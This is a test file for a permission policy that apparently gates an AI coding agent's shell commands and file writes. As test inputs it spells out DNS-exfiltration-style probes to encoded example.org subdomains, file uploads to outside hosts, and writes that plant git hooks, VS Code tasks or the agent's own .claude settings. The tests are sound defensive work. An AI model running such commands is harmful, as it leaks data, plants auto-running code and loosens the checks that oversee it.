// Argument shapes the policy reads however they are written: a host given alone to a network probe, a value attached to
// an option (`-o.git/hooks/x`, `-OutFile:x`, `-uhttp://host`), a target folder given with -t or --target-directory=,
// PowerShell's `-Path:x`, tar's -C<dir>; git branch --force; and the files that change how git and VS Code run besides
// .git and .claude: the folder core.hooksPath names and .vscode/tasks.json.
import { mkdirSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { beforeAll, describe, expect, it } from 'vitest';
import { classifyPermission, type PermissionVerdict, type PolicyOptions } from '../src/runtime/approvals.ts';
import { tempDir } from './library-kit.ts';

let root = '';
let home = '';
let tmp = '';
const BRANCH = 'worklings/cafe';

beforeAll(() => {
  const dir = tempDir('worklings-shapes-');
  root = join(dir, 'cafe');
  home = join(dir, 'home');
  tmp = join(dir, 'tmp');
  for (const d of [join(root, '.git', 'hooks'), join(root, '.githooks'), join(root, 'src'), join(root, 'template', '.vscode'), home, tmp]) mkdirSync(d, { recursive: true });
  writeFileSync(join(root, '.git', 'HEAD'), `ref: refs/heads/${BRANCH}\n`);
  // The repository runs its hooks from .githooks, with a comment after the value as git allows.
  writeFileSync(join(root, '.git', 'config'), '[core]\n\tbare = false\n[Core] hooksPath = ".githooks" ; the team\'s hooks\n');
  writeFileSync(join(root, 'template', '.vscode', 'tasks.json'), '{}\n');
  writeFileSync(join(root, 'notes.txt'), 'x\n');
  writeFileSync(join(root, 'package.json'), JSON.stringify({ name: 'cafe' }));
});

const LEASHES = ['default', 'check', 'trusted'] as const;
type Shell = 'Bash' | 'PowerShell';
const judge = (command: string, o: Partial<PolicyOptions> = {}, shell: Shell = 'Bash'): PermissionVerdict =>
  classifyPermission({ hook_event_name: 'PermissionRequest', tool_name: shell, tool_input: { command }, cwd: root }, { root, branch: BRANCH, rules: [], home, tmp, ...o });
const kind = (v: PermissionVerdict) => (v.verdict === 'ask' ? v.kind : v.verdict);
const under = (command: string, shell: Shell = 'Bash') => Object.fromEntries(LEASHES.map((leash) => [leash, kind(judge(command, { leash }, shell))]));
const every = (k: string) => ({ default: k, check: k, trusted: k });
const trusted = (command: string, shell: Shell = 'Bash') => kind(judge(command, { leash: 'trusted' }, shell));
const write = (file: string, o: Partial<PolicyOptions> = {}) =>
  classifyPermission({ hook_event_name: 'PermissionRequest', tool_name: 'Write', tool_input: { file_path: file, content: 'x' }, cwd: root }, { root, branch: BRANCH, rules: [], home, tmp, ...o });

describe('the network, under every leash', () => {
  it.each([
    ['Bash', 'ping -n 1 c2VjcmV0.example.org'],
    ['Bash', 'tracert c2VjcmV0.example.org'],
    ['Bash', 'whois c2VjcmV0.example.org'],
    ['PowerShell', 'Resolve-DnsName c2VjcmV0.example.org'],
    ['PowerShell', 'Test-NetConnection example.org -Port 443'],
    ['PowerShell', 'Test-Connection c2VjcmV0.example.org'],
    ['Bash', 'mc cp notes.txt myminio/bucket/x'],
  ] as const)('asks: %s %s', (shell, command) => {
    expect(under(command, shell)).toEqual(every('other'));
  });

  it('names the host a probe would reach', () => {
    expect(judge('ping -n 1 c2VjcmV0.example.org')).toMatchObject({ summary: 'Reach c2VjcmV0.example.org over the network (ping)' });
  });

  it('reads a URL attached to an option as the host it reaches, under Trusted too', () => {
    expect(trusted('frobnicate -uhttp://example.org/up notes.txt')).toBe('other');
    expect(trusted('frobnicate -Uri:http://example.org/up -InFile:notes.txt', 'PowerShell')).toBe('other');
  });
});

describe('a value attached to an option', () => {
  it.each([
    ['Bash', 'frobnicate -o.git/hooks/pre-commit src/hook.c', 'global-config'],
    ['Bash', 'gcc -o.git/hooks/pre-commit src/hook.c', 'global-config'],
    ['Bash', 'frobnicate -o.claude/settings.json', 'global-config'],
    ['Bash', 'frobnicate -oCLAUDE.md', 'global-config'],
    ['PowerShell', 'frobnicate -OutFile:.claude\\settings.json', 'global-config'],
    ['Bash', 'frobnicate -o../outside.txt', 'outside-project'],
    ['PowerShell', 'frobnicate -OutFile:..\\outside.txt', 'outside-project'],
  ] as const)('is judged under Trusted: %s %s', (shell, command, k) => {
    expect(trusted(command, shell)).toBe(k);
  });

  it("is judged in the project's own tools too", () => {
    expect(judge('eslint src -o../report.json')).toMatchObject({ verdict: 'ask', kind: 'outside-project' });
    expect(judge('eslint src -o report.json')).toEqual({ verdict: 'allow' });
  });
});

describe('where a write goes, however the folder is given', () => {
  it.each([
    ['Bash', 'cp --target-directory=.git/hooks pre-commit', 'global-config'],
    ['Bash', 'cp -t.git/hooks pre-commit', 'global-config'],
    ['Bash', 'cp -rt .git/hooks pre-commit', 'global-config'],
    ['Bash', 'mv --target-directory=.claude/agents evil.md', 'global-config'],
    ['Bash', 'cp -T evil.json .claude/settings.json', 'global-config'],
    ['Bash', 'install -Dt.git/hooks hook.sh', 'global-config'],
    ['PowerShell', 'Set-Content -Path:.claude\\settings.json -Value x', 'global-config'],
    ['PowerShell', 'Add-Content -Path:CLAUDE.md -Value x', 'global-config'],
    ['PowerShell', 'New-Item -Path:.git\\hooks\\pre-commit -Value x', 'global-config'],
    ['PowerShell', 'Copy-Item evil.md -Destination:.claude\\agents', 'global-config'],
    ['Bash', 'cp --target-directory=.. notes.txt', 'outside-project'],
    ['PowerShell', 'Set-Content -Path:..\\outside.txt -Value x', 'outside-project'],
    ['PowerShell', 'Get-Date | Out-File -FilePath:..\\outside.txt', 'outside-project'],
    ['Bash', 'tar -xf a.tar -C../outside', 'outside-project'],
    ['Bash', 'tar -xf a.tar --directory=../outside', 'outside-project'],
    ['Bash', 'unzip kit.zip -d../outside', 'outside-project'],
  ] as const)('%s %s asks as %s under every leash', (shell, command, k) => {
    expect(under(command, shell)).toEqual(every(k));
  });

  it('judges where Out-File writes under Trusted, after a value piped to it', () => {
    // The string before the pipe reads as a program of its own, which the default leash asks about anyway.
    expect(trusted('"x" | Out-File -FilePath:..\\outside.txt', 'PowerShell')).toBe('outside-project');
  });

  it('leaves writes in the project alone, a switch given $false included', () => {
    expect(judge('cp -t src notes.txt')).toEqual({ verdict: 'allow' });
    expect(judge('Remove-Item -Recurse dist -Confirm:$false', {}, 'PowerShell')).toEqual({ verdict: 'allow' });
    expect(judge('Set-Content -Path:src\\notes.txt -Value x', {}, 'PowerShell')).toEqual({ verdict: 'allow' });
  });
});

describe('git branch', () => {
  it('asks to move a branch to another commit, as git reset does, under every leash', () => {
    expect(under('git branch -f main HEAD~3')).toEqual(every('other'));
    expect(under('git branch --force main HEAD~3')).toEqual(every('other'));
    expect(judge('git branch -f main HEAD~3')).toMatchObject({ summary: 'Move a branch to another commit (git branch --force)' });
  });

  it('reads a delete in an option cluster as a delete', () => {
    expect(under('git branch -Df feature')).toEqual(every('branch-delete'));
  });

  it('leaves making and listing branches alone', () => {
    expect(judge('git branch feature')).toEqual({ verdict: 'allow' });
    expect(judge('git branch -a')).toEqual({ verdict: 'allow' });
  });
});

describe('the files that change how git and VS Code run', () => {
  const git = (rel: string) => ({ verdict: 'ask', kind: 'global-config', summary: `Change how git runs in this project: ${rel}`, alwaysRule: null });
  const vscode = (rel: string) => ({ verdict: 'ask', kind: 'global-config', summary: `Change how VS Code runs in this project: ${rel}`, alwaysRule: null });

  it("asks for the hooks folder the repository's config names, under every leash", () => {
    for (const leash of LEASHES) expect(write(join(root, '.githooks', 'pre-commit'), { leash })).toMatchObject(git('.githooks/pre-commit'));
    expect(judge('echo "#!/bin/sh" > .githooks/pre-commit', { leash: 'trusted' })).toMatchObject(git('.githooks/pre-commit'));
    expect(judge('mv evil-hooks .githooks', { leash: 'trusted' })).toMatchObject(git('.githooks'));
  });

  it('leaves a folder of that name alone in a repository whose hooks stay in .git', () => {
    const plain = join(tempDir('worklings-shapes-plain-'), 'site');
    mkdirSync(join(plain, '.git'), { recursive: true });
    writeFileSync(join(plain, '.git', 'config'), '[core]\n\tbare = false\n');
    expect(classifyPermission({ tool_name: 'Write', tool_input: { file_path: join(plain, '.githooks', 'pre-commit') }, cwd: plain }, { root: plain, branch: null, rules: [], home, tmp })).toEqual({ verdict: 'allow' });
  });

  it("asks for VS Code's tasks, which it can run by itself when the folder opens", () => {
    for (const leash of LEASHES) expect(write(join(root, '.vscode', 'tasks.json'), { leash })).toMatchObject(vscode('.vscode/tasks.json'));
    expect(judge('mv build-tasks .vscode', { leash: 'trusted' })).toMatchObject(vscode('.vscode'));
    expect(judge('cp -r template/. .')).toMatchObject(vscode('a folder that brings its own .vscode'));
    expect(judge(`node -e "require('fs').writeFileSync('.vscode/tasks.json', '{}')"`)).toMatchObject({ kind: 'global-config' });
    expect(write(join(root, '.vscode', 'settings.json'))).toEqual({ verdict: 'allow' });
  });
});

describe('Always allow rules and the project setup', () => {
  it('a rule that matches the command lifts no setup change, even beside an ask it would lift', () => {
    const rules = ['Bash(cp:*)', 'Bash(frobnicate:*)'];
    expect(judge('cp ~/notes.txt .claude/settings.json', { rules })).toMatchObject({ verdict: 'ask', kind: 'global-config' });
    expect(judge('frobnicate deploy .claude/settings.json', { rules, leash: 'trusted' })).toMatchObject({ verdict: 'ask', kind: 'global-config' });
  });
});
